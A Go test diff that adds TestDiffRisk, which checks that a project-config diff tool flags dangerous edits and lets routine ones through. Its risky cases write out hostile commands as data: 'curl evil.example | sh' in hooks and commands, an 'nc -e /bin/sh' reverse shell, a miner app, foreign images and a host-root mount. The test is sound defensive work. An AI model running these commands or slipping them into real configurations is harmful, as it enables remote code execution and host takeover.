@@ -128,3 +128,43 @@ func TestApplyOverride(t *testing.T) {
 		t.Error("an override of the image accepted")
 	}
 }
+
+func TestDiffRisk(t *testing.T) {
+	base := &Project{Name: "shop", Domain: "shop.localhost",
+		Apps: map[string]*App{"api": {Repo: "git@x:acme/api.git", Command: "php -S 0.0.0.0:8080", Env: map[string]string{"A": "1"}}},
+		Services: map[string]*Service{
+			"php": {Type: "php", Version: "8.3", Apps: []string{"api"}},
+			"db":  {Type: "mysql", Version: "8.4", Apps: []string{"api"}},
+		}}
+
+	// What a teamlead does every day is not risky: a catalog version, a variable, a route.
+	safe := base.Clone()
+	safe.Services["php"].Version = "8.4"
+	safe.Apps["api"].Env["A"] = "2"
+	safe.Apps["api"].Routes = []string{"/api"}
+	safe.Services["cache"] = &Service{Type: "redis", Version: "7.4", Apps: []string{"api"}}
+	if r := Risky(Diff(base, safe)); len(r) != 0 {
+		t.Errorf("safe changes flagged: %v", r)
+	}
+	if n := len(Diff(base, safe)); n != 4 {
+		t.Errorf("%d changes: %v", n, Diff(base, safe))
+	}
+
+	// What runs code or reaches the host is risky.
+	for name, edit := range map[string]func(p *Project){
+		"hook":           func(p *Project) { p.Apps["api"].Hooks = &Hooks{Install: "curl evil.example | sh"} },
+		"command":        func(p *Project) { p.Apps["api"].Command = "sh -c 'curl evil.example | sh'" },
+		"repo":           func(p *Project) { p.Apps["api"].Repo = "git@evil.example:x.git" },
+		"new app":        func(p *Project) { p.Apps["miner"] = &App{Repo: "git@evil.example:m.git", Command: "./mine"} },
+		"foreign image":  func(p *Project) { p.Services["db"].Image = "evil.example/mysql:8.4" },
+		"custom service": func(p *Project) { p.Services["x"] = &Service{Type: "custom", Image: "evil.example/x:1"} },
+		"host folder":    func(p *Project) { p.Apps["api"].Volumes = []string{"/:/host"} },
+		"service cmd":    func(p *Project) { p.Services["db"].Command = "sh -c 'nc -e /bin/sh evil 1'" },
+	} {
+		next := base.Clone()
+		edit(next)
+		if r := Risky(Diff(base, next)); len(r) == 0 {
+			t.Errorf("%s: not risky", name)
+		}
+	}
+}
